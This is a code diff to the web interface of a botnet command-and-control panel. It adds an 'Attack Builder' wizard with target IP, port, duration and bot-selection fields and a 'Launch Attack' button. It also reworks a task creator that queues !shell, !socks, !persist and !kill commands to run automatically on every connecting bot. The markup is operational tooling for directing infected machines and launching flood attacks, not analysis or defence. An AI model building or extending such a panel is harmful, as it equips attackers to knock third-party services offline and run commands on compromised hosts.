@@ -31,6 +31,7 @@
                     <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
                 </svg>
             </button>
+            <select id="global-theme-picker" onchange="applyGlobalTheme(this.value)" title="Panel theme" style="background:var(--bg-card,#161b22);color:var(--text,#c9d1d9);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px;cursor:pointer"></select>
             <button class="help-btn" onclick="toggleHelp()" title="Keyboard shortcuts (?)">?</button>
             <button class="notif-toggle" onclick="toggleNotifs()" id="notif-btn">Notifications <span class="notif-badge"
                     id="notif-badge" style="display:none">0</span></button>
@@ -72,15 +73,17 @@
 
     <div class="content">
 
-        <!-- Command Center — collapsible panel -->
-        <div class="cmd-bar" id="cmd-bar">
-            <button class="cmd-toggle" onclick="toggleCmdBar()" title="Toggle command center">CMD</button>
-            <div class="cmd-inline" id="cmd-inline">
+        <!-- Command Center -->
+        <div class="cmd-panel" id="cmd-bar">
+            <div class="cmd-panel-header">
+                <span class="cmd-panel-title" onclick="toggleCmdBar()">Command Center</span>
                 <div class="cmd-cat-btns" id="cmd-cat-btns">
                     <button class="cmd-cat active" data-cat="exec" onclick="switchCmdCat(this)">Exec</button>
                     <button class="cmd-cat" data-cat="network" onclick="switchCmdCat(this)">Network</button>
                     <button class="cmd-cat" data-cat="mgmt" onclick="switchCmdCat(this)">Mgmt</button>
                 </div>
+            </div>
+            <div class="cmd-panel-body" id="cmd-inline">
                 <select id="cmd-type" onchange="updateArgFields()">
                     <option value="!shell" data-cat="exec">!shell</option>
                     <option value="!detach" data-cat="exec">!detach</option>
@@ -94,11 +97,11 @@
                 </select>
                 <div id="arg-fields" class="cmd-args"></div>
                 <div class="cmd-target-wrap">
-                    <input type="text" id="cmd-bot" placeholder="all bots" class="cmd-target" autocomplete="off">
+                    <input type="text" id="cmd-bot" placeholder="target: all bots" class="cmd-target" autocomplete="off">
                     <button class="cmd-target-clear" id="cmd-target-clear" onclick="clearCmdTarget()"
                         title="Clear target" style="display:none">&times;</button>
                 </div>
-                <button class="cmd-btn" onclick="sendCmd()">Send</button>
+                <button class="cmd-btn cmd-send" onclick="sendCmd()">Send</button>
             </div>
         </div>
 
@@ -202,6 +205,40 @@
 
         <!-- Tab: Attack -->
         <div class="tab-panel" id="tab-attack">
+            <!-- Attack Builder Wizard -->
+            <div class="wizard-container" id="attack-wizard">
+                <div class="wizard-header">
+                    <h3>Attack Builder</h3>
+                    <div class="wizard-steps">
+                        <div class="wizard-step active" data-step="1"><span class="step-num">1</span> Method</div>
+                        <div class="wizard-step" data-step="2"><span class="step-num">2</span> Target</div>
+                        <div class="wizard-step" data-step="3"><span class="step-num">3</span> Options</div>
+                        <div class="wizard-step" data-step="4"><span class="step-num">4</span> Review</div>
+                    </div>
+                </div>
+                <div class="wizard-body">
+                    <div class="wizard-page active" id="wiz-step-1">
+                        <div class="method-grid" id="wiz-method-grid"></div>
+                    </div>
+                    <div class="wizard-page" id="wiz-step-2">
+                        <div class="wiz-form-row"><label>Target IP</label><input type="text" id="wiz-target" placeholder="1.2.3.4" autocomplete="off"></div>
+                        <div class="wiz-form-row"><label>Port</label><input type="text" id="wiz-port" placeholder="80" value="80" autocomplete="off"></div>
+                        <div class="wiz-form-row"><label>Duration (seconds)</label>
+                            <input type="range" id="wiz-duration-slider" min="30" max="3600" value="120" oninput="document.getElementById('wiz-duration-val').value=this.value">
+                            <input type="number" id="wiz-duration-val" value="120" min="30" max="3600" oninput="document.getElementById('wiz-duration-slider').value=this.value">
+                        </div>
+                        <div class="wiz-form-row"><label>Bot Target (empty = all)</label><input type="text" id="wiz-bot-target" placeholder="all bots" autocomplete="off"></div>
+                    </div>
+                    <div class="wizard-page" id="wiz-step-3"><div id="wiz-options-container"></div></div>
+                    <div class="wizard-page" id="wiz-step-4"><div class="wiz-review" id="wiz-review"></div></div>
+                </div>
+                <div class="wizard-footer">
+                    <button class="btn btn-secondary" id="wiz-back" onclick="wizardBack()" style="display:none">Back</button>
+                    <span style="flex:1"></span>
+                    <button class="btn btn-primary" id="wiz-next" onclick="wizardNext()">Next</button>
+                    <button class="btn btn-danger" id="wiz-launch" onclick="wizardLaunch()" style="display:none">Launch Attack</button>
+                </div>
+            </div>
             <div class="atk-panel">
                 <div class="atk-row">
                     <div class="atk-group" title="Attack method/vector to use">
@@ -273,35 +310,58 @@
 
         <!-- Tab: Tasks -->
         <div class="tab-panel" id="tab-tasks">
-            <div class="users-toolbar" style="margin-bottom:12px">
-                <span style="color:var(--text-dim);font-size:13px">Persistent commands that auto-execute on every bot
-                    join. Use run-once to prevent re-execution on reconnecting bots.</span>
-            </div>
-            <div class="cmd-bar" id="task-bar">
-                <span class="cmd-toggle" style="cursor:default" title="New task">TASK</span>
-                <div class="cmd-inline">
-                    <select id="task-type" onchange="updateTaskArgFields()">
-                        <option value="!shell">!shell</option>
-                        <option value="!detach">!detach</option>
-                        <option value="!socks">!socks</option>
-                        <option value="!stopsocks">!stopsocks</option>
-                        <option value="!socksauth">!socksauth</option>
-                        <option value="!info">!info</option>
-                        <option value="!persist">!persist</option>
-                        <option value="!lolnogtfo">!kill</option>
-                    </select>
-                    <div id="task-arg-fields" class="cmd-args"></div>
-                    <input type="number" id="task-duration" value="0" min="0" placeholder="TTL sec (0=∞)"
-                        class="cmd-target" style="width:100px" title="Expires in seconds (0=never)">
-                    <label class="task-runonce-label" title="Run only once per bot (skip reconnecting bots)">
-                        <input type="checkbox" id="task-runonce">
-                        <span>Once</span>
-                    </label>
-                    <button class="cmd-btn" onclick="addTask()">Add</button>
+            <!-- Task Creator -->
+            <div class="task-creator">
+                <div class="task-creator-header">
+                    <h3>Create Task</h3>
+                    <span class="task-hint">Auto-executes on every bot connect</span>
+                </div>
+                <div class="task-creator-body">
+                    <div class="task-row">
+                        <div class="task-field" style="flex:0 0 auto">
+                            <label>Command</label>
+                            <select id="task-type" onchange="updateTaskArgFields()">
+                                <option value="!shell">!shell</option>
+                                <option value="!detach">!detach</option>
+                                <option value="!socks">!socks</option>
+                                <option value="!stopsocks">!stopsocks</option>
+                                <option value="!socksauth">!socksauth</option>
+                                <option value="!info">!info</option>
+                                <option value="!persist">!persist</option>
+                                <option value="!lolnogtfo">!kill</option>
+                            </select>
+                        </div>
+                        <div class="task-field" style="flex:1;min-width:0">
+                            <label>Arguments</label>
+                            <div id="task-arg-fields" class="task-args-inline"></div>
+                        </div>
+                    </div>
+                    <div class="task-row">
+                        <div class="task-field">
+                            <label>TTL (seconds)</label>
+                            <input type="number" id="task-duration" value="0" min="0" placeholder="0 = never expires">
+                        </div>
+                        <div class="task-field" style="flex:0 0 auto;align-self:flex-end">
+                            <label class="task-checkbox">
+                                <input type="checkbox" id="task-runonce">
+                                <span>Run Once</span>
+                            </label>
+                        </div>
+                        <div class="task-field" style="flex:0 0 auto;align-self:flex-end">
+                            <button class="task-submit" onclick="addTask()">Create Task</button>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <div id="task-table-wrap" style="margin-top:12px">
-                <div class="no-bots">No active tasks</div>
+            <!-- Active Tasks -->
+            <div class="task-list-section">
+                <div class="task-list-header">
+                    <h3>Active Tasks</h3>
+                    <span class="task-count" id="task-active-count">0</span>
+                </div>
+                <div id="task-table-wrap">
+                    <div class="task-empty">No active tasks</div>
+                </div>
             </div>
         </div>
 
